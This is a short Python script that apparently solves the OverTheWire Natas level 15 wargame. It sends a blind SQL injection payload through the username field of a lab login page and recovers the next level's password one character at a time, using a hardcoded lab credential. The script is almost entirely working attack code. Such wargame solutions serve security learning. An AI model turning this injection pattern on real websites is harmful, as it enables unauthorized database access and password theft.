import requests
import string
import base64
import itertools

def build_password():
    letters = string.printable
    tmp = "a"

    while(len(tmp) < 32):
        for letter in letters:
            if is_subpassword(letter + tmp):
                print("added " + letter + " to " + tmp)
                tmp = letter + tmp
                break
            elif is_subpassword(tmp + letter):
                print("added " + tmp + " to " + letter)
                tmp = tmp + letter
                break
    return tmp

def is_subpassword(suggestion):
    auth_key = "Basic " + base64.b64encode(b"natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J").decode("utf-8")
    result = requests.post("http://natas15.natas.labs.overthewire.org/index.php", 
                            headers={"Authorization": auth_key}, 
                            data={"username": "natas16\" and password like \"%" + suggestion + "%\" COLLATE latin1_general_cs or \""})
    return suggestion not in string.punctuation and "This user exists." in result.text

print(build_password())
